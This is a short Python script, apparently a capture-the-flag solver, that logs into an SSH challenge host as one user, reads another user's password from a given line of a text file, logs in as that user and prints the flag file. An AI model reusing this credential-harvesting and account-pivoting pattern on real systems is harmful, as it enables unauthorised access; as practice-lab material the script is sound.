import paramiko
from pwn import *


def get_emma_password(HOST, PORT, angela_password):
    ssh = paramiko.SSHClient()
    ssh.load_system_host_keys()
    ssh.connect(hostname=HOST, username="angela", password=angela_password, port=PORT)

    # Using sed to get the password at line 4069 
    p = log.progress("emma")
    time.sleep(1)
    stdin, stdout, stderr = ssh.exec_command("sed -n '4069p' findme.txt ")
    stdout = stdout.readlines()
    emma_password = "".join(stdout).split()[0]
    p.status(emma_password)

    # Get flag
    ssh = paramiko.SSHClient()
    ssh.load_system_host_keys()
    ssh.connect(hostname=HOST, username="emma", password=emma_password, port=PORT)

    stdin, stdout, stderr = ssh.exec_command("cat flagz.txt")
    stdout = stdout.readlines()
    flag = "".join(stdout).split()[0]
    p.success(emma_password + " : " + flag)
    ssh.close()

    return emma_password

